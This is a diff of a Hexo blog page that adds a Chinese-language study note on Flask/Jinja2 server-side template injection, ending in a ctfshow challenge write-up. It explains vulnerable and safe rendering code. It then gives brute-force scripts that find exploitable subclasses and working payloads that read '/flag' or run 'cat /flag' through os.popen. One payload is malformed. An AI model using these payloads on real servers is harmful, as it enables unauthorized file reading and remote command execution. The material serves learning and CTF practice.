@@ -41,11 +41,11 @@
 <meta property="og:title" content="SSTI">
 <meta property="og:url" content="http://example.com/2025/03/23/SSTI/index.html">
 <meta property="og:site_name" content="Hexo">
-<meta property="og:description" content="SSTI学习笔记前言到底是什么原因，学一个Flask竟然让我博客死机了，第一次hexo g运行失败，根本不知道怎么搞这个东西，如果实在不行背水一战把Flak笔记迁移出去试下">
+<meta property="og:description" content="SSTI学习笔记前言到底是什么原因，学一个Flask竟然让我博客死机了，第一次hexo g运行失败，根本不知道怎么搞这个东西，如果实在不行背水一战把Flak笔记迁移出去试下。刚才去试了一下，果然是flask的原因，把这个文件移除博客即可 1.漏洞原理有了以上关于Flask的基础知识，我们就可以来看看漏洞是如何产生的了。由于对用户输入过滤不严，攻击者可以通过构造恶意数据，使服务器模板引擎渲染这部分数">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
 <meta property="article:published_time" content="2025-03-23T07:58:07.000Z">
-<meta property="article:modified_time" content="2025-03-23T08:00:55.254Z">
+<meta property="article:modified_time" content="2025-03-25T03:02:51.207Z">
 <meta property="article:author" content="John Doe">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
@@ -1744,7 +1744,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     debug: "env",
     cdn: {"js":{"app":"/js/app.js","parallax":"/js/plugins/parallax.js","rightMenu":"/js/plugins/rightMenu.js","rightMenus":"/js/plugins/rightMenus.js","sites":"/js/plugins/tags/sites.js","friends":"/js/plugins/tags/friends.js","contributors":"/js/plugins/tags/contributors.js","search":"/js/search/hexo.js"},"css":{"style":"/css/style.css"}},
     default: {"avatar":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/avatar/round/3442075.svg","link":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/link/8f277b4ee0ecd.svg","cover":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/cover/76b86c0226ffd.svg","image":"https://unpkg.com/volantis-static@0.0.1654736714924/media/placeholder/image/2659360.svg"},
-    lastupdate: new Date(1742716915715),
+    lastupdate: new Date(1742886474842),
     sidebar: {
       for_page: ["blogger","category","tagcloud","donate"],
       for_post: ["toc"],
@@ -2585,7 +2585,195 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
   <div id="layoutHelper-page-plugins"></div>
   <div id="post-body" itemprop="articleBody">
-    <h1 id="SSTI学习笔记"><a href="#SSTI学习笔记" class="headerlink" title="SSTI学习笔记"></a>SSTI学习笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>到底是什么原因，学一个Flask竟然让我博客死机了，第一次hexo g运行失败，根本不知道怎么搞这个东西，如果实在不行背水一战把Flak笔记迁移出去试下</p>
+    <h1 id="SSTI学习笔记"><a href="#SSTI学习笔记" class="headerlink" title="SSTI学习笔记"></a>SSTI学习笔记</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>到底是什么原因，学一个Flask竟然让我博客死机了，第一次hexo g运行失败，根本不知道怎么搞这个东西，如果实在不行背水一战把Flak笔记迁移出去试下。刚才去试了一下，果然是flask的原因，把这个文件移除博客即可</p>
+<h2 id="1-漏洞原理"><a href="#1-漏洞原理" class="headerlink" title="1.漏洞原理"></a>1.漏洞原理</h2><p>有了以上关于Flask的基础知识，我们就可以来看看漏洞是如何产生的了。由于对用户输入过滤不严，攻击者可以通过构造恶意数据，使服务器模板引擎渲染这部分数据，从而达到读取文件、RCE等目的。</p>
+<p>下面，我们来看一下分析一下存在SSTI漏洞的代码和不存在漏洞的代码，对比学习，体会一下这个漏洞的原理。</p>
+<p>存在SSTI漏洞的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template_string</span><br><span class="line"><span class="keyword">from</span> jinja2 <span class="keyword">import</span> Template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, default=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    t = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span> % (name)</span><br><span class="line">    <span class="comment"># 将一段字符串作为模板进行渲染</span></span><br><span class="line">    <span class="keyword">return</span> render_template_string(t)</span><br><span class="line"></span><br><span class="line"><span class="string">&quot;&quot;&quot;这样的代码同样存在漏洞</span></span><br><span class="line"><span class="string">def index():</span></span><br><span class="line"><span class="string">    name = request.args.get(&#x27;name&#x27;, default=&#x27;guest&#x27;)</span></span><br><span class="line"><span class="string">    t = Template(</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">        &lt;html&gt;</span></span><br><span class="line"><span class="string">            &lt;h1&gt;Hello %s&lt;/h1&gt;</span></span><br><span class="line"><span class="string">        &lt;/html&gt;</span></span><br><span class="line"><span class="string">        &#x27;&#x27;&#x27; % name</span></span><br><span class="line"><span class="string">    )</span></span><br><span class="line"><span class="string">    # 对模板对象进行渲染</span></span><br><span class="line"><span class="string">    return t.render()</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>
+
+<p>这段代码是将用户的输入先拼接到模板中再进行渲染，我感觉就是渲染过程让我们输入的恶意代码执行了</p>
+<p>让我们来看下不存在漏洞的代码</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    name = request.args.get(<span class="string">&#x27;name&#x27;</span>, default=<span class="string">&#x27;guest&#x27;</span>)</span><br><span class="line">    <span class="comment"># </span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>, name=name)</span><br><span class="line"></span><br><span class="line">app.run()</span><br></pre></td></tr></table></figure>
+
+<p>通过观察以上代码，我们可以发现漏洞出现的原因：服务器端将用户可控的输入<strong>直接拼接到模板中进行渲染</strong>，导致漏洞出现。反之，要解决该漏洞，则只需<strong>先将模板渲染，再拼接</strong>字符串。</p>
+<p>深入到Flask渲染函数原理来讲，render和render_template_string由用户拼接，字符串不会自动转义，而render_template会对字符串计进行<strong>自动转义</strong>，因此避免了参数被作为表达式执行。</p>
+<h2 id="2-漏洞利用思路"><a href="#2-漏洞利用思路" class="headerlink" title="2.漏洞利用思路"></a>2.漏洞利用思路</h2><p><strong>利用思路</strong></p>
+<p>这里以通过SSTI进行RCE为例，基本的利用思路为：</p>
+<ul>
+<li>随便找个倒霉的内置类：[]、””</li>
+<li>通过这个类获取到object类：<strong>base__、__bases__、__mro</strong></li>
+<li>通过object类获取所有子类：<strong>subclasses</strong>()</li>
+<li>在子类列表中找到<strong>可以利用的类</strong></li>
+<li>直接调用类下面函数或使用该类空间下可用的其他模块的函数</li>
+</ul>
+<p><strong>魔术方法</strong></p>
+<p>为此，我们需要用到以下魔术方法：</p>
+<table>
+<thead>
+<tr>
+<th align="center">魔术方法</th>
+<th align="center">作用</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">_<em>init</em>_</td>
+<td align="center">对象的初始化方法</td>
+</tr>
+<tr>
+<td align="center">_<em>class</em>_</td>
+<td align="center">返回对象所属的类</td>
+</tr>
+<tr>
+<td align="center">_<em>module</em>_</td>
+<td align="center">返回类所在的模块</td>
+</tr>
+<tr>
+<td align="center">_<em>mro</em>_</td>
+<td align="center">返回类的调用顺序，可以此找到其父类（<strong>用于找父类</strong>）</td>
+</tr>
+<tr>
+<td align="center">_<em>base</em>_</td>
+<td align="center">获取类的直接父类（<strong>用于找父类</strong>）</td>
+</tr>
+<tr>
+<td align="center">_<em>bases</em>_</td>
+<td align="center">获取父类的元组，按它们出现的先后排序（<strong>用于找父类</strong>）</td>
+</tr>
+<tr>
+<td align="center">_<em>dict</em>_</td>
+<td align="center">返回当前类的函数、属性、全局变量等</td>
+</tr>
+<tr>
+<td align="center">_<em>subclasses</em>_</td>
+<td align="center">返回所有仍处于活动状态的引用的列表，列表按定义顺序排列（<strong>用于找子类</strong>）</td>
+</tr>
+<tr>
+<td align="center">_<em>globals</em>_</td>
+<td align="center">获取函数所属空间下可使用的模块、方法及变量（<strong>用于访问全局变量</strong>）</td>
+</tr>
+<tr>
+<td align="center">_<em>import</em>_</td>
+<td align="center">用于导入模块，经常用于导入os模块</td>
+</tr>
+<tr>
+<td align="center">_<em>builtins</em>_</td>
+<td align="center">返回Python中的内置函数，如eval</td>
+</tr>
+</tbody></table>
+<p>获取对象所属的类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br><span class="line">().__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span class="line">[].__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;list&#x27;</span>&gt;</span><br><span class="line"> <span class="string">&quot;&quot;</span>.__class__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+
+
+<p>获取父类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__base__</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__bases__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;,)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&#x27;&#x27;</span>.__class__.__mro__</span><br><span class="line">(&lt;<span class="keyword">class</span> <span class="string">&#x27;str&#x27;</span>&gt;, &lt;<span class="keyword">class</span> <span class="string">&#x27;object&#x27;</span>&gt;)</span><br></pre></td></tr></table></figure>
+
+
+
+<p>获取子类</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__base__.__subclasses__()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__bases__[<span class="number">0</span>].__subclasses__()</span><br><span class="line"><span class="string">&#x27;&#x27;</span>.__class__.__mro__[-<span class="number">1</span>].__subclasses__()</span><br></pre></td></tr></table></figure>
+
+<h2 id="3-常用注入模块"><a href="#3-常用注入模块" class="headerlink" title="3.常用注入模块"></a>3.常用注入模块</h2><p>每次获取到的各种类实在太多了，根本不知道用哪些</p>
+
+
+<h3 id="1-文件读取"><a href="#1-文件读取" class="headerlink" title="1.文件读取"></a>1.文件读取</h3><p>我们进行文件读取需要使用到子类:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;<span class="keyword">class</span><span class="string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span>&gt;</span><br></pre></td></tr></table></figure>
+
+<p>这个函数可以进行服务器的文件读取，但是在这之前我们需要判断是否存在这个子类，我们通过一个简单的脚本去拿到子类然后找出来</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;]&#125;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>这个就是进行了一个简单的查询，把查询到序号输出</p>
+<p>我们找到模块之后就需要调用这个模块上面的内置函数，我们读取文件使用的是get_data()这个模块中的内置方法</p>
+<p>回来了，我果然还是脚本水平不行，这个脚本没错。只不过我之前用的都是POST请求，GET请求的时候需要把请求那里的data改为params</p>
+<p><strong><code>get_data</code> 的作用</strong></p>
+<p><code>get_data</code> 方法的主要功能是从文件系统中读取指定路径的文件内容，并将其作为字节数据返回。可以读取任意文件</p>
+<p><strong>语法</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">get_data</span>(<span class="params">self, path: <span class="built_in">str</span></span>) -&gt; <span class="built_in">bytes</span>:</span><br></pre></td></tr></table></figure>
+
+<p>我们可以通过这个构造payload：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">79</span>][<span class="string">&#x27;get_data&#x27;</span>](<span class="number">0</span>,<span class="string">&#x27;/flag&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="2-内建函数eval命令执行"><a href="#2-内建函数eval命令执行" class="headerlink" title="2.内建函数eval命令执行"></a>2.内建函数eval命令执行</h3><p>php里面有eval进行任意代码执行，python里面也有，但是这次eval属于一个函数，我们首先需要找到带有eval()函数的模块，和之前查找模块的脚本差不多</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    data=&#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&quot;+str(i)+&quot;].__init__.__globals__[&quot;__builtins__&quot;]&#125;&#125;&#x27;</span></span><br><span class="line"><span class="comment">#__init__对这个子类进行实体化，__globals__获取所有的可使用的模块、方法及变量</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.post(url,data=data)</span><br><span class="line">        <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;eval&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>在 Python 中，<code>__builtins__</code> 是一个内置模块，包含了 Python 的所有内置函数、异常和常量。它是 Python 解释器在启动时自动加载的，提供了语言的核心功能。</p>
+<p>所以我们可以通过访问__builtins__去获取这个模块所有的内置函数，我们去这里面找到这个模块去使用eval()函数</p>
+<p><code>os</code> 模块是 Python 标准库中的一个核心模块，提供了与操作系统交互的功能。通过 <code>os</code> 模块，你可以执行以下操作：</p>
+<ul>
+<li>管理文件和目录。</li>
+<li>执行系统命令。</li>
+<li>获取系统信息。</li>
+<li>管理环境变量。</li>
+</ul>
+<p>我们可以通过使用os模块下的popen方法，去进行命令执行</p>
+<p><code>os.popen()</code> 是 <code>os</code> 模块中的一个方法，用于执行系统命令并获取其输出。它允许你通过 Python 脚本与操作系统的 shell 进行交互，并捕获命令的输出或向其输入数据。</p>
+<p><strong>语法</strong></p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">os.popen(command, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>)</span><br></pre></td></tr></table></figure>
+
+<ul>
+<li>**<code>command</code>**：要执行的系统命令（字符串）。</li>
+<li>**<code>mode</code>**：模式，默认为 <code>&#39;r&#39;</code>（读取命令的输出）。也可以是 <code>&#39;w&#39;</code>（向命令输入数据）。</li>
+<li>**<code>buffering</code>**：缓冲策略，默认为 <code>-1</code>（使用系统默认缓冲）。</li>
+</ul>
+<p>在执行完命令以后，我们需要加一个read()函数让命令执行结果去回显到页面</p>
+<p>我们构造一个payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.base.__.__subclass__.()[<span class="number">37</span>].__init__.__globals__[<span class="string">&#x27;builtins&#x27;</span>][<span class="string">&#x27;eval&#x27;</span>](<span class="string">&#x27;__import__(&quot;os&quot;).popen(&quot;cat /flag&quot;).read()&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过import方法引入‘os’模块，使用popen执行shell命令，使用read函数回显</p>
+<p>我们还有其他方法去引入os模块</p>
+
+
+
+
+<h3 id="3-os模块执行命令"><a href="#3-os模块执行命令" class="headerlink" title="3.os模块执行命令"></a>3.os模块执行命令</h3><p>我们之前使用eval命令执行的条件是通过eval执行引入’os’模块的方法，我们也可以不使用eval函数</p>
+<p>我们可以像之前一样，直接在所有子类中找到含有os模块的子类然后进行调用os模块即可</p>
+
+
+<p>这是一些加载os模块的一些方法</p>
+<h3 id="4-importlib类执行命令"><a href="#4-importlib类执行命令" class="headerlink" title="4.importlib类执行命令"></a>4.importlib类执行命令</h3>
+
+<p>我么也可以通过找到importlib这个子类去加载os模块</p>
+<p>但是这个查找和文件读取的查找差不多，大概就是系统固定这个子类肯定包含这个函数</p>
+<p>这个类长得和import很像不是没有原因的，和import加载各种库一样，这个也可以去加载其他库，我们使用load_module这个函数加载库</p>
+<p>payload</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;[].__class__.__base__.__subclasses__()[<span class="number">37</span>][<span class="string">&quot;load_module&quot;</span>](<span class="string">&quot;os&quot;</span>)[<span class="string">&quot;popen&quot;</span>](<span class="string">&#x27;cat flag.php&#x27;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="5-linecache函数执行命令"><a href="#5-linecache函数执行命令" class="headerlink" title="5.linecache函数执行命令"></a>5.linecache函数执行命令</h3>
+
+<p>这又和我们之前的东西不一样了，之前我一直以为是类-&gt;模块-&gt;函数这个模式去调用的</p>
+<p>模块要么从类中直接加载，要么通过函数加载。但是这个方法的出现打破了我之前的大部分理解，函数中引入了模块，而且加载模块不是执行什么代码，而是直接从函数中加载模块和类一样，只能说明这三者的关系应该是相互包含</p>
+<h3 id="6-subprocess-Popen类执行命令"><a href="#6-subprocess-Popen类执行命令" class="headerlink" title="6.subprocess.Popen类执行命令"></a>6.subprocess.Popen类执行命令</h3>
+
+
+
+
+
+
+
+<h2 id="4-ctfshow"><a href="#4-ctfshow" class="headerlink" title="4.ctfshow"></a>4.ctfshow</h2><p>学完了一些注入模块，后面又到了经典的ctfshow环节，绕过方法等写完题目后自然就会了</p>
+<h3 id="361关"><a href="#361关" class="headerlink" title="361关"></a>361关</h3><p>这是第一个题目，刚开始是做的时候还不是很熟悉，出了很多问题，但现在都解决了，由于是第一个题目，我会用文件读取和命令执行两种方法去拿到flag</p>
+<p><strong>文件读取</strong></p>
+<p>这个题目是通过GET请求参数name实现SSTI注入的，没有任何过滤，我们先通过脚本找到文件读取需要的子类的位置</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://976724af-5bca-49c2-9f9e-b209c0856d21.challenge.ctf.show/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&#x27;</span> +<span class="built_in">str</span>(i)+ <span class="string">&#x27;]&#125;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url,params=params)</span><br><span class="line">        <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="comment">#print(response.text)</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;_frozen_importlib_external.FileLoader&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>这个子类中固定有get_data()函数，我们使用其读取指定路径下的文件，但我感觉这个有点鸡肋，我们该怎么知道flag的路径</p>
+<p>payload:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">name=&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">94</span>][<span class="string">&#x27;get_data&#x27;</span>](<span class="number">0</span>,<span class="string">&#x27;/flag&#x27;</span>)&#125;&#125;</span><br></pre></td></tr></table></figure>
+
+
+
+<p><strong>命令执行</strong></p>
+<p>我感觉这个方法才是以后的主流解题方法，毕竟命令执行随便就能拿到flag。</p>
+<p>我们还是先用脚本试下有没有命令执行函数</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">url=<span class="string">&#x27;http://976724af-5bca-49c2-9f9e-b209c0856d21.challenge.ctf.show/&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">500</span>):</span><br><span class="line">    params=&#123;</span><br><span class="line">        <span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;&#123;&#123;().__class__.__base__.__subclasses__()[&#x27;</span>+<span class="built_in">str</span>(i)+<span class="string">&#x27;].__init__.__globals__&#125;&#125;&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        response = requests.get(url,params=params)</span><br><span class="line">        <span class="keyword">if</span> response.status_code==<span class="number">200</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&#x27;popen&#x27;</span> <span class="keyword">in</span> response.text:</span><br><span class="line">                <span class="built_in">print</span>(i)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br></pre></td></tr></table></figure>
+
+<p>也是成功跑出来了，直接调用popen命令执行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&#123;().__class__.__base__.__subclasses__()[<span class="number">132</span>].__init__.__globals__[<span class="string">&#x27;popen&#x27;</span>](<span class="string">&quot;cat /flag&quot;</span>).read()&#125;&#125;</span><br></pre></td></tr></table></figure>
+
 
   </div>
   
@@ -2610,10 +2798,10 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <div class='new-meta-box'>
       
         
-          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-23T16:00:55+08:00">
+          <div class="new-meta-item date" itemprop="dateModified" datetime="2025-03-25T11:02:51+08:00">
   <a class='notlink'>
     <i class="fa-solid fa-edit fa-fw" aria-hidden="true"></i>
-    <p>更新于：Mar 23, 2025</p>
+    <p>更新于：Mar 25, 2025</p>
   </a>
 </div>
 
@@ -2752,7 +2940,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
 
 
     <div class='content'>
-        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li></ol>
+        <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-text">前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#1-%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-text">1.漏洞原理</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8%E6%80%9D%E8%B7%AF"><span class="toc-text">2.漏洞利用思路</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#3-%E5%B8%B8%E7%94%A8%E6%B3%A8%E5%85%A5%E6%A8%A1%E5%9D%97"><span class="toc-text">3.常用注入模块</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96"><span class="toc-text">1.文件读取</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-%E5%86%85%E5%BB%BA%E5%87%BD%E6%95%B0eval%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C"><span class="toc-text">2.内建函数eval命令执行</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-os%E6%A8%A1%E5%9D%97%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">3.os模块执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-importlib%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">4.importlib类执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#5-linecache%E5%87%BD%E6%95%B0%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">5.linecache函数执行命令</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#6-subprocess-Popen%E7%B1%BB%E6%89%A7%E8%A1%8C%E5%91%BD%E4%BB%A4"><span class="toc-text">6.subprocess.Popen类执行命令</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#4-ctfshow"><span class="toc-text">4.ctfshow</span></a><ol class="toc-child"><li 